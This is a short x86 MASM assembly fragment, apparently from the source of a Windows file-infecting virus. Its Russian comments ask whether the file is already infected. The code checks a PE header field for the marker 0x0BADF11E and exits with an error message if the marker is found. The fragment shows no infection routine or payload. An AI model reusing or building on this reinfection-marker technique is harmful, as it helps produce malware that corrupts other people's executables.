;##############################Не заражен ли уже файл?############################
        mov edi,pOptionalHeader
        assume edi:PTR IMAGE_OPTIONAL_HEADER
        .IF [edi].Win32VersionValue==00BADF11Eh
                push MB_ICONERROR
                push offset TitleMes1
                push offset Error2Str
                push 0
                call MessageBox
                jmp Exit
        .ENDIF
;##########################END Не заражен ли уже файл?############################